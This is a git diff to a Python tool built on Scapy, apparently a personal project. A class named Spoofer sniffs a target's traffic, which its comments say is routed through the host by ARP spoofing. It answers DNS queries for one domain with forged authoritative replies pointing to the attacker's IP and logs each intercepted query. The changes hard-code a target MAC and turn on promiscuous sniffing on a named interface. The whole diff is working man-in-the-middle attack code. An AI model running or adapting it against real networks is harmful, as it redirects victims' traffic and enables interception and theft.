@@ -4,7 +4,14 @@ from scapy.layers.inet import UDP,IP #type :ignore
 from scapy.layers.dns import DNS,DNSQR,DNSRR
 
 from data.data_helper import record_entry
+import scapy.config
+scapy.config.conf.noenum.add(scapy.config.conf.route.resync)
+scapy.config.conf.use_pcap = True
+scapy.config.conf.use_dnet = False #type:ignore
+#disable DNS resolution
+scapy.config.conf.netcache.resolve = False #type:ignore
 import scapy.all as scapy
+
 
 import json
 import time
@@ -17,7 +24,7 @@ class Spoofer:
         self.__router_ip = router_ip
         # Getting mac of the target
         # self.__target_mac = self.get_mac(self.__target_ip)
-        self.__target_mac = "46:7A:60:FD:EA:D6"
+        self.__target_mac = "1e:00:da:26:fe:10 "
 
     def send_spoofed_packet(self): # Main
         """sending spoofed packet.
@@ -84,6 +91,7 @@ class Spoofer:
             #print("Found dns packets")
             domain = packet[DNSQR].qname.decode().rstrip(".")
             if 'info' in domain:
+
                 pass
             if domain == "www.techqng.info.com":
                 #print(f"Intercepted DNS query for {domain}")
@@ -97,12 +105,14 @@ class Spoofer:
                         qr=1,            # Response flag
                         aa=1,            # Authoritative answer
                         qd=packet[DNS].qd,  # Copy query section
+                        #ra=1,
                         an=DNSRR(rrname=domain, type="A", ttl=300, rdata=self.__ip)
                     )
                 )
 
                 # Send spoofed response
                 scapy.send(response_packet, verbose=0)
+                record_entry(domain,self.build_dict_from_packet(packet))
                 print(f"Spoofed DNS response sent: {domain} -> {self.__ip}")
             else:
                 response_packet = self.nslookup(domain)
@@ -117,7 +127,7 @@ class Spoofer:
         Using scapy to sniff all of the packets from target to router, and calling process_packet to handle them.
         """
         while True:
-            scapy.sniff(filter=f"udp port 53",prn=self.process_packet,store=0,timeout=1)
+            scapy.sniff(iface="en1",prn=self.process_packet,promisc=True,store=0,timeout=4)
             self.urls = self.get_urls()
         # Capture all packets sent from the target, and not meant for host. because of the ARP spoofing, this packets are meant to be sent to the router.
         # Dump all corresponding packets into process_packet to handle.
@@ -129,7 +139,7 @@ class Spoofer:
         d: dict = {}
         d["Time"] = str(time.time())
         d["IP"] = packet[IP].src
-        d["MAC address"] = self.get_mac(d["IP"])
+        #d["MAC address"] = self.get_mac(d["IP"])
         return d
 
 
